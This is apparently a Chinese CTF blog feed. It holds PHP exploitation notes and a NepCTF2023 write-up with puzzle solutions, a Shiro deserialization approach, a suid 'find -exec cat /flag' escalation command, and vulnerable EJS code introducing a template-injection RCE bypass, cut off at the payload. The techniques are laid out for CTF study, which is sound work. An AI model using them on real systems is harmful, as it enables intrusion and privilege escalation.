+AF8AXw-halt+AF8-compiler()+ADs&quot;</span><br><br><span class="hljs-meta"># 第二次</span><br>php_value include_path <span class="hljs-string">&quot;/tmp&quot;</span> <span class="hljs-meta">#将<span class="hljs-keyword">include</span>()的默认路径改变</span><br>php_flag zend.multibyte <span class="hljs-number">1</span><br>php_value zend.script_encoding <span class="hljs-string">&quot;UTF-7&quot;</span><br></code></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/tr1ple/p/11439994.html">X-NUCA-ezphp</a></p><h2 id="session-serialize-handler-三种引擎"><a href="#session-serialize-handler-三种引擎" class="headerlink" title="session.serialize_handler(三种引擎)"></a>session.serialize_handler(三种引擎)</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">php</span>(默认的）键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值<br>php_binary   键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 <span class="hljs-built_in">serialize</span>() 函数反序列处理的值<br>php_serialize (php&gt;=<span class="hljs-number">5.5</span>.<span class="hljs-number">4</span>)经过 <span class="hljs-built_in">serialize</span>() 函数反序列处理的数组<br></code></pre></td></tr></table></figure><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903144909405.png" alt="image-20230903144909405"></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903144926904.png" alt="image-20230903144926904"></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903144942736.png" alt="image-20230903144942736"></p><p>当一个服务器（session文件和PHPSESSID相同），的两个页面使用不同处理器就会存在phpsession反序列化漏洞</p><h2 id="利用session-upload-progress进行文件包含"><a href="#利用session-upload-progress进行文件包含" class="headerlink" title="利用session_upload_progress进行文件包含***"></a>利用session_upload_progress进行文件包含***</h2><p>挺重要的一个考点</p><p>原理看过很多次，但感觉要是遇到的话还是很迷茫,找不到题目,实际操作一次就会很清醒了）</p><p>这个似懂非懂就不写了</p><p>但真的非常重要</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php的__wakeup绕过</title>
    <link href="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/"/>
    <url>/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NepCTF2023</title>
    <link href="/2023/08/31/NepCTF2023/"/>
    <url>/2023/08/31/NepCTF2023/</url>
    
    <content type="html"><![CDATA[<h1 id="Nepctf2023-复现"><a href="#Nepctf2023-复现" class="headerlink" title="Nepctf2023(复现)"></a>Nepctf2023(复现)</h1><p><strong>比赛战队名：shimmer</strong></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">NepCTF</span><span class="hljs-template-variable">&#123;H4ve_Fun_1N_This_Game&#125;</span><br></code></pre></td></tr></table></figure><h3 id="与AI共舞的哈夫曼"><a href="#与AI共舞的哈夫曼" class="headerlink" title="与AI共舞的哈夫曼"></a>与AI共舞的哈夫曼</h3><p>利用AI写出对应的解压函数即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decompress</span>(<span class="hljs-params">input_file, output_file</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-comment"># Read frequency information</span><br><br>        num_symbols = <span class="hljs-built_in">int</span>.from_bytes(f.read(<span class="hljs-number">1</span>), byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br>        frequencies = &#123;&#125;<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_symbols):<br>            byte = <span class="hljs-built_in">int</span>.from_bytes(f.read(<span class="hljs-number">1</span>), byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br>            freq = <span class="hljs-built_in">int</span>.from_bytes(f.read(<span class="hljs-number">4</span>), byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br>            frequencies[byte] = freq<br><br>        <span class="hljs-comment"># Build Huffman tree</span><br><br>        root = build_huffman_tree(frequencies)<br><br>        <span class="hljs-comment"># Read compressed data</span><br><br>        compressed_data = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            byte = f.read(<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> byte:<br>                <span class="hljs-keyword">break</span><br><br>            compressed_data += <span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(byte), <span class="hljs-string">&#x27;08b&#x27;</span>)<br><br>    current_node = root<br><br>    decompressed_data = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> compressed_data:<br>        <span class="hljs-keyword">if</span> bit == <span class="hljs-string">&#x27;0&#x27;</span>:<br>            current_node = current_node.left<br><br>        <span class="hljs-keyword">else</span>:<br>            current_node = current_node.right<br><br>        <span class="hljs-keyword">if</span> current_node.char <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            decompressed_data += <span class="hljs-built_in">chr</span>(current_node.char)<br>            current_node = root<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(decompressed_data)<br></code></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">Nepctf</span><span class="hljs-template-variable">&#123;huffman_zip_666&#125;</span><br></code></pre></td></tr></table></figure><h3 id="codes"><a href="#codes" class="headerlink" title="codes"></a>codes</h3><p>题目要求读取环境变量</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv,<span class="hljs-type">char</span> **envp)</span></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the 1st envp is : %s\n&quot;</span>,envp[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>env被列入黑名单，修改为其他变量名即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//最终payload</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv,<span class="hljs-type">char</span> **enp)</span></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the 1st envp is : %s\n&quot;</span>,enp[<span class="hljs-number">12</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Nepctf</span>&#123;easy_codes_49260e9f-bcb8-<span class="hljs-number">4</span>bb3-<span class="hljs-number">9</span>a8f-<span class="hljs-number">7</span>c0418978cda_[TEAM_HASH]&#125;<br></code></pre></td></tr></table></figure><h3 id="小叮弹钢琴"><a href="#小叮弹钢琴" class="headerlink" title="小叮弹钢琴"></a>小叮弹钢琴</h3><p>使用audacity打开</p><p>前半段为摩斯密码，长的为<code>-</code>，短的为<code>.</code>，中间空的为空格</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">youshouldusethistoxorsomething</span><br></code></pre></td></tr></table></figure><p>后半段侧过来看是一串16进制</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0</span>x370a05303c290e045005031c2b1858473a5f052117032c39230f<span class="hljs-number">005d1e17</span><br></code></pre></td></tr></table></figure><p>根据提示把他俩异或</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">b= <span class="hljs-string">&#x27;youshouldusethistoxorsomething&#x27;</span><br><span class="hljs-selector-tag">a</span> = <span class="hljs-selector-attr">[0x37,0x0a,0x05,0x30,0x3c,0x29,0x0e,0x04,0x50,0x05,0x03,0x1c,0x2b,0x18,0x58,0x47,0x3a,0x5f,0x05,0x21,0x17,0x03,0x2c,0x39,0x23,0x0f,0x00,0x5d,0x1e,0x17]</span><br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    e += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-selector-tag">b</span><span class="hljs-selector-attr">[i]</span>)^<span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[i]</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(e)</span></span><br></code></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">NepCTF</span><span class="hljs-template-variable">&#123;h4ppy_p14N0&#125;</span><span class="language-xml">NepCTF</span><span class="hljs-template-variable">&#123;h4pp</span><br></code></pre></td></tr></table></figure><h3 id="陌生的语言"><a href="#陌生的语言" class="headerlink" title="陌生的语言"></a>陌生的语言</h3><p><img src="/2023/08/31/NepCTF2023/%E9%99%8C%E7%94%9F%E7%9A%84%E7%BA%B8%E6%9D%A1.jpg" alt="题目"></p><p>根据提示Atsuko Kagari，找到小魔女学院，搜索<code>小魔女学院文字</code>发现<code>新月文字</code></p><p>然后继续找到<code>古龙语</code></p><p><img src="/2023/08/31/NepCTF2023/fb569e24b899a9014e4b15075b950a7b0208f568.jpg" alt="img"></p><p><img src="/2023/08/31/NepCTF2023/image-20230817081407279.png" alt="image-20230817081407279"></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">NepCTF&#123;NEPNEP_<span class="hljs-built_in">A_BELIEVING</span>_HEART_IS_YOUR_MAGIC&#125;<br></code></pre></td></tr></table></figure><h3 id="你也喜欢三月七吗"><a href="#你也喜欢三月七吗" class="headerlink" title="你也喜欢三月七吗"></a>你也喜欢三月七吗</h3><p>题目</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">啊！开拓者，这群名看起来怪怪的诶。 （伸出脑袋，凑近群名，轻轻的闻了一下）哇，好咸诶，开拓者你快来看看！<br><br>需要经过啥256处理一下<br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">salt_lenth</span>= <span class="hljs-number">10</span> <br><span class="hljs-attr">key_lenth</span>= <span class="hljs-number">16</span> <br><span class="hljs-attr">iv</span>= <span class="hljs-number">88219</span>bdee9c396eca3c637c0ea436058 <span class="hljs-comment">#原始iv转hex的值</span><br><span class="hljs-attr">ciphertext</span>= b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc<br><br></code></pre></td></tr></table></figure><p>解析题目：群名、咸（salt）、sha256</p><p>Key为salt（群名）用sha256加密的前16位</p><p>看代码发现<code>iv和key</code>猜测是AES256</p><p><img src="/2023/08/31/NepCTF2023/image-20230817083833353.png" alt="image-20230817083833353"></p><p>用cyberchef<code>Mode</code>要调为<code>NoPadding</code></p><p>得到一张图片</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//img</span>1.imgtp.com<span class="hljs-regexp">/2023/</span><span class="hljs-number">07</span><span class="hljs-regexp">/24/y</span>OkXWSJT.png<br></code></pre></td></tr></table></figure><p><img src="/2023/08/31/NepCTF2023/%E4%BD%A0%E7%8E%A9%E8%BF%87%E6%98%9F%E7%A9%B9%E9%93%81%E9%81%93%E5%90%97.png" alt="图片"></p><p>搜索<code>星穹铁道文字</code>       （<code>I</code>不容易看出是大写）</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">NepCTF</span><span class="hljs-template-variable">&#123;HRP_aIways_likes_March_7th&#125;</span><br></code></pre></td></tr></table></figure><h3 id="ConnectedFive"><a href="#ConnectedFive" class="headerlink" title="ConnectedFive"></a>ConnectedFive</h3><p>看别人都说玩完就行，但还是搞不懂</p><h3 id="EZII-BASIC"><a href="#EZII-BASIC" class="headerlink" title="EZII BASIC"></a>EZII BASIC</h3><p>题目关键词：1977年 世界上第一批大规模生产的个人电脑   BASIC语言</p><p><img src="/2023/08/31/NepCTF2023/image-20230819031956318.png" alt="image-20230819031956318"></p><p><img src="/2023/08/31/NepCTF2023/image-20230819032307820.png" alt="image-20230819032307820"></p><p><img src="/2023/08/31/NepCTF2023/image-20230819032325509.png" alt="image-20230819032325509"></p><p><img src="/2023/08/31/NepCTF2023/image-20230819032355056.png" alt="image-20230819032355056"></p><p>可以看到第十行是<code>END</code></p><p>运行时把第十行修改一下</p><p><img src="/2023/08/31/NepCTF2023/image-20230819032446411.png" alt="image-20230819032446411"></p><p>然后<code>RUN</code></p><p><img src="/2023/08/31/NepCTF2023/image-20230819032625921.png" alt="image-20230819032625921"></p><p>这里复现就不比对了</p><h2 id="WEB（参考Boogipop的博客和官方WP）"><a href="#WEB（参考Boogipop的博客和官方WP）" class="headerlink" title="WEB（参考Boogipop的博客和官方WP）"></a>WEB（参考Boogipop的博客和官方WP）</h2><p>（没环境复现，都是大佬的图，给的题目附件不会用）</p><h3 id="ez-java-checkin"><a href="#ez-java-checkin" class="headerlink" title="ez_java_checkin"></a>ez_java_checkin</h3><p>经典的shrio rememberMe反序列化</p><p>利用CC2的链去打</p><p>这里用工具一把梭</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#算是非预期</span><br>cat /start.sh<br><br><span class="hljs-comment">#/bin/bash</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">GZCTF_FLAG</span>=NepcTF&#123;Ezjava_Chekin&#125;<br>echo <span class="hljs-variable">$GZCTF_FLAG</span> &gt; /flag<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">GZCTF_FLAG</span>=<span class="hljs-string">&quot;HAHA,NO FLAG but boom.&quot;</span><br>su ctf -c <span class="hljs-string">&quot;bash -c &#x27;java -jar /ShiroSpring-0.0.1-SNAPSHOT.jar&#x27;&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#预期</span><br><span class="hljs-built_in">ls</span> /usr/bin -l|grep rws    <span class="hljs-comment">##查找可suid提权</span><br><br>find suid 提权<br><span class="hljs-built_in">touch</span> /tmp/evil&amp;find /tmp/evil -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cat</span> /flag \;<br></code></pre></td></tr></table></figure><h3 id="Post-Crad-For-You"><a href="#Post-Crad-For-You" class="headerlink" title="Post Crad For You"></a>Post Crad For You</h3><p>两篇文章了解ejs模板注入</p><p><a href="https://xz.aliyun.com/t/12323#toc-1">Ejs模板引擎注入实现RCE - 先知社区 (aliyun.com)</a></p><p><a href="https://inhann.top/2023/03/26/ejs/">https://inhann.top/2023/03/26/ejs/</a></p><p>题目代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;crypto&quot;</span>);<br><br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>()<br><span class="hljs-keyword">const</span> port = <span class="hljs-number">3000</span><br><br>templateDir = path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;template&#x27;</span>);<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;template&#x27;</span>, templateDir);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-params">milliSeconds</span>)&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">StartTime</span> =<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>();<br>    <span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>() &lt;<span class="hljs-title class_">StartTime</span>+milliSeconds);<br><br>&#125;<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">sendFile</span>(<span class="hljs-string">&#x27;./index.html&#x27;</span>, &#123;<span class="hljs-attr">root</span>: __dirname&#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/create&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">let</span> uuid;<br>    <span class="hljs-keyword">let</span> name = req.<span class="hljs-property">query</span>.<span class="hljs-property">name</span> ?? <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">let</span> address = req.<span class="hljs-property">query</span>.<span class="hljs-property">address</span> ?? <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">let</span> message = req.<span class="hljs-property">query</span>.<span class="hljs-property">message</span> ?? <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">do</span> &#123;<br>        uuid = crypto.<span class="hljs-title function_">randomUUID</span>();<br>    &#125; <span class="hljs-keyword">while</span> (fs.<span class="hljs-title function_">existsSync</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;templateDir&#125;</span>/<span class="hljs-subst">$&#123;uuid&#125;</span>.ejs`</span>))<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (name != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; address != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; message != <span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>            <span class="hljs-keyword">let</span> source = [<span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;source1&quot;</span>, <span class="hljs-string">&quot;source2&quot;</span>, <span class="hljs-string">&quot;source3&quot;</span>].<span class="hljs-title function_">sort</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0.5</span> - <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>();<br>            &#125;)<br>            fs.<span class="hljs-title function_">readFile</span>(source[<span class="hljs-number">0</span>]+<span class="hljs-string">&quot;.html&quot;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">err, pageContent</span>)&#123;<br>                fs.<span class="hljs-title function_">writeFileSync</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;templateDir&#125;</span>/<span class="hljs-subst">$&#123;uuid&#125;</span>.ejs`</span>, pageContent.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/--ID--/g</span>, uuid.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/-/g</span>, <span class="hljs-string">&quot;&quot;</span>)));<br>                <span class="hljs-title function_">sleep</span>(<span class="hljs-number">2000</span>);<br>            &#125;)<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Params `name` or `address` or `message` empty&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span>(err) &#123;<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Failed to write file&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">`/page?pageid=<span class="hljs-subst">$&#123;uuid&#125;</span>&amp;name=<span class="hljs-subst">$&#123;name&#125;</span>&amp;address=<span class="hljs-subst">$&#123;address&#125;</span>&amp;message=<span class="hljs-subst">$&#123;message&#125;</span>`</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/page&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req,res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">query</span>.<span class="hljs-property">pageid</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-[4][0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;12&#125;$/i</span>.<span class="hljs-title function_">test</span>(id) || !fs.<span class="hljs-title function_">existsSync</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;templateDir&#125;</span>/<span class="hljs-subst">$&#123;id&#125;</span>.ejs`</span>)) &#123;<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Sorry, no such id&quot;</span>)<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;templateDir&#125;</span>/<span class="hljs-subst">$&#123;id&#125;</span>.ejs`</span>, req.<span class="hljs-property">query</span>);<br>&#125;)<br><br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`App listening on port <span class="hljs-subst">$&#123;port&#125;</span>`</span>)<br>&#125;)<br></code></pre></td></tr></table></figure><p>关键代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/page&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req,res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">query</span>.<span class="hljs-property">pageid</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-[4][0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;12&#125;$/i</span>.<span class="hljs-title function_">test</span>(id) || !fs.<span class="hljs-title function_">existsSync</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;templateDir&#125;</span>/<span class="hljs-subst">$&#123;id&#125;</span>.ejs`</span>)) &#123;<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Sorry, no such id&quot;</span>)<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;templateDir&#125;</span>/<span class="hljs-subst">$&#123;id&#125;</span>.ejs`</span>, req.<span class="hljs-property">query</span>);<br>&#125;)<br></code></pre></td></tr></table></figure><p><code>req.query</code>放入<code>render</code>存在ejs模板注入</p><p>正常ejs模板注入是利用<code>opts.outputFunctionName 、opts.localsName 、opts.destructuredLocals</code> </p><p>而<code>cve2022的Bypass</code>是因为他们无法通过正则，于是找到<code>opts.escapeFunction</code>，使用<code>opts.escapeFunction</code>要保证<code>opts.client</code>不为空</p><p>此处使用cve2022的bypass （由于没有题目环境，无法确认，但应该是要绕过正则的）</p><p><code>payload</code>如下</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">/<span 